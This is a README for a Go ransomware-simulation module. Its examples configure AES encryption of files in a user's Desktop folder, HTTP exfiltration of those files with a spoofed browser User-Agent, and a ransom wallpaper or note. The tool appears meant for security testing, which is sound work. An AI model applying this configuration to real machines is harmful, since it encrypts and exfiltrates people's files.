# Ransimware

<a href="https://www.buymeacoffee.com/mjwhitta">🍪 Buy me a cookie</a>

[![Go Report Card](https://goreportcard.com/badge/gitlab.com/mjwhitta/ransimware)](https://goreportcard.com/report/gitlab.com/mjwhitta/ransimware)

## What is this?

This Go module allows you to simulate ransomware.

## How to install

Open a terminal and run the following:

```
$ go get -u gitlab.com/mjwhitta/ransimware
```

## Usage

Minimal example:

```
package main

import (
    "os"
    "path/filepath"

    rw "gitlab.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Since no encrypt function is defined, the default behavior is
    // to do no encryption

    // Since no exfil function is defined, the default behavior is to
    // do no exfil

    // Since no notify function is defined, the default is to create a
    // ransomnote.txt (in $HOME on Linux and the user's Desktop on
    // Windows)

    // Target the user's Desktop folder
    if home, e = os.UserHomeDir(); e == nil {
        if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
            panic(e)
        }
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

More complex example:

```
package main

import (
    "os"
    "path/filepath"
    "strings"

    rw "gitlab.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Set encryption method to AES using provided helper function
    sim.Encrypt = rw.AESEncrypt("password")

    // Set exfil method to be HTTP using provided helper function
    sim.Exfil = rw.HTTPExfil(
        "http://localhost:8080",
        map[string]string{
            "User-Agent": strings.Join(
                []string{
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "AppleWebKit/537.36 (KHTML, like Gecko)",
                    "Chrome/84.0.4147.105 Safari/537.36",
                },
                " ",
            ),
        },
    )

    // Notify user by changing wallpaper using the provided helper
    // function
    sim.Notify = rw.WallpaperNotify(
        "C:\\Windows\\Temp\\ransom.png",
        rw.DefaultPNG,
    )

    // Target the user's Desktop folder
    if home, e = os.UserHomeDir(); e == nil {
        if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
            panic(e)
        }
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

## Links

- [Source](https://gitlab.com/mjwhitta/ransimware)

## TODO

- Provide more helper functions
    - Base64 encoding
    - DNS exfil
    - FTP exfil
    - Generic ransom note function with custom text
